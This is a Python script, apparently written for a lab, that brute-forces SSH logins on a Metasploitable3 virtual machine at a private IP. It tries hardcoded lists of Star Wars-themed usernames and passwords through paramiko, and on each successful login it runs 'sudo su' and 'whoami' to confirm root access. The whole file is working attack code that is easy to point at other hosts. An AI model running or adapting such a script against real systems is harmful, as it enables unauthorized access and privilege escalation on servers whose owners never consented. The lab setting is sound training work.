# We need these libraries to establish a SSH connection and add delays
import paramiko
import time

# Attack-related data, we copied this from the usernames.txt and passwords.txt
metasploitable3_ip = "192.168.56.102"

usernames = [ "leah_organa", "luke_skywalker", "han_solo", "artoo_detoo", "c_three_pio", "ben_kenobi", "vagrant", "darth_vader", "anakin_skywalker", "jarjar_binks", "lando_calrissian", "boba_fett", "jabba_hutt", "greedo", "chewbacca", "kylo_ren" ]

passwords = [ "help_me_obiw@n", "use_the_force", "sh00t-first", "beep_b00p", "pr0t0c0l", "thats_no_moon", "vagrant", "d@rk_sid3", "yipp33!!", "mesah_p@ssw0rd", "b@ckstab", "mandalorian1", "not-a-slug12", "hanShotFirst!", "rwaaaaawr5", "daddy_issues1" ]

# This method attempts to establish a SSH connection with the username and password provided, if success returns the client connection, otherwise returns None
def attempt_login(user, pw):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(metasploitable3_ip, username=user, password=pw, timeout=5)
        print("Logging in as", user, pw)
        return client
    except:
        return None

# This method runs the privilege escalation and verification commands, will be used if a valid client is found
def run_cmds(client):
    shell = client.invoke_shell()
    time.sleep(0.5)
    shell.send("sudo su\n")
    time.sleep(0.5)
    shell.send("whoami\n")
    time.sleep(1)
    print(shell.recv(4096).decode())
    shell.close()

# Try all combinations
for i in range(0, len(usernames)):
    usr = usernames[i]
    pwd = passwords[i]
    status = False

    try:
        session = attempt_login(usr, pwd)

        if session:
            run_cmds(session)
            session.close()
            status = True

        # We got SSH banner errors for flooding connections so we added this delay
        time.sleep(1.5)

        print(usr, ":", pwd, status)
    except:
        print(usr, ":", pwd, "SSH error")

print("Complete.")